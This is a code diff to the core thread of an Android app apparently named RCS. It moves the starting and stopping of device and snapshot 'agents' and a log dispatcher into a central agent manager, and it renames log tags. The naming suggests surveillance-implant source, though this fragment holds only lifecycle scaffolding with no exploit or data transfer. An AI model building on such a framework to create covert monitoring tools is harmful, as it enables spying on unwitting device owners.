@@ -10,9 +10,6 @@ package com.ht.RCSAndroidGUI;
 import android.app.Activity;
 import android.content.ContentResolver;
 import android.content.res.Resources;
-import android.os.HandlerThread;
-import android.os.Looper;
-import android.os.Message;
 import android.util.Log;
 
 public class CoreThread extends Activity implements Runnable {
@@ -20,9 +17,11 @@ public class CoreThread extends Activity implements Runnable {
 	private Resources resources;
 	private Thread coreThread;
 	private ContentResolver contentResolver;
+	private AgentManager agentManager;
 
 	public boolean Start(Resources r, ContentResolver cr) {
 		coreThread = new Thread(this);
+		agentManager = AgentManager.self();
 
 		resources = r;
 		contentResolver = cr;
@@ -35,13 +34,13 @@ public class CoreThread extends Activity implements Runnable {
 
 	public boolean Stop() {
 		bStopCore = true;
-		Log.d("Que", "RCS Thread Stopped");
+		Log.d("RCS", "RCS Thread Stopped");
 		return true;
 	}
 
 	// Runnable (main routine for RCS)
 	public void run() {
-		Log.d("Que", "RCS Thread Started");
+		Log.d("RCS", "RCS Thread Started");
 
 		try {
 			// Initialize the configuration object
@@ -59,40 +58,36 @@ public class CoreThread extends Activity implements Runnable {
 			logDispatcher.start();
 			
 			// Start agents
+			agentManager.startAgents();
+			agentManager.stopAgent(Agent.AGENT_DEVICE);
+			agentManager.startAgent(Agent.AGENT_DEVICE);
+			
+
 			Utils.sleep(3000);
-			DeviceAgent deviceAgent = new DeviceAgent();
-			deviceAgent.start();
 			
-			SnapshotAgent snapshotAgent = new SnapshotAgent();
-			snapshotAgent.start();
-			
-			deviceAgent.sendMessage(Agent.AGENT_STOP, 0x0);
-			snapshotAgent.sendMessage(Agent.AGENT_STOP, 0x0);
-	
-			Utils.sleep(10000);
+			// Stop agents
+			agentManager.stopAgents();
 			
 			// Ci stiamo chiudendo
 			logDispatcher.halt();
 			logDispatcher.join();
+		
 			
+			Log.d("RCS", "LogDispatcher Killed");
+
 		} catch (RCSException rcse) {
 			rcse.printStackTrace();
-			Log.d("Que", "RCSException() detected");
+			Log.d("RCS", "RCSException() detected");
 		} catch (Exception e) {
 			e.printStackTrace();
-			Log.d("Que", "Exception() detected");			
+			Log.d("RCS", "Exception() detected");			
 		}
 		
-		Log.d("Que", "Exiting core");	
+		Log.d("RCS", "Exiting core");	
 		return;
-		
-		/*while (bStopCore == false) {
-			// Task Init
 
-			// Check Action
-		}*/
 	}
-	
+
 	public boolean Init() {
 		return false;
 	}
